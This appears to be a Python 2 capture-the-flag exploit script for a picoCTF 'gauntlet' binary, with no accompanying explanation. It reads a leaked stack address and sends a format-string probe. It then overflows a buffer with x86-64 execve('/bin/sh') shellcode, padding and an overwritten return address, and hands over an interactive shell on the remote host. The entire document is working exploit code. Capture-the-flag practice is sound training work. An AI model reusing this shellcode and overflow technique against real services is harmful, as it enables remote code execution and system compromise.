# sudo socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./gauntlet"
import socket
import time
import binascii
import struct
s = socket.socket()
s.connect(('mercury.picoctf.net', 11022))
# s.connect(('localhost', 1337))
r = s.recv(14) # 0x7fffffffeb30
print("[*] Address: " + r)
start_buf = int(r,16)
r = s.recv(1024)
firstString = "%p,%p,%p\n"
print("[*] Sending first string: " + firstString)
s.send(firstString)
while ',' not in r:
    r = s.recv(1024)
print("[*] First String Response: " + r)
padding = "A"*90
RIP = struct.pack("Q", start_buf)
print(struct.unpack('Q', RIP))
print(RIP)
# shellcode = "A"*64
shellcode = "\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload = shellcode + padding + RIP +"\n"
print("[*] Payload: " + payload)
raw_input("Send Input?")
s.send(payload)

from telnetlib import Telnet
t = Telnet()
t.sock = s
t.interact()
s.close()